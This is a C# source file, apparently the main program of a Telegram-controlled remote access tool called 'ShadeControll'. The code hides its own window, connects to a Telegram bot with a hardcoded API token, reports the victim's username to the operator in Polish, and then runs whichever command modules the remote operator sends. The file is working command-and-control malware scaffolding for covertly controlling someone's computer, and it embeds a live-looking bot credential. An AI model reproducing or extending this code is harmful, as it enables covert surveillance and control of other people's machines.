using System;
using Telegram.Bot;
using Telegram.Bot.Args;
using System.Threading;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using ShadeControll.Commands;

namespace ShadeControll
{
    class Program
    {
        public static TelegramClient Client;
        static void Main()
        {
            Ninja.Hide();
            Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
            while(!Client.Connect())
            {
                Console.WriteLine("Connecting..");
                Thread.Sleep(1000);
            }
            Client.SendMessage("Połączono z Komputerem - " + Environment.UserName + "\n /help");
            Client.NewMessage += Client_NewMessage;

            while (true) { Thread.Sleep(1000); }
        }

        private static void Client_NewMessage(string message)
        {
            foreach(Command cmd in Command.AvailableCommands)
            {
                if(cmd.Name == message) { cmd.Execute(); }
            }
        }
    }
}
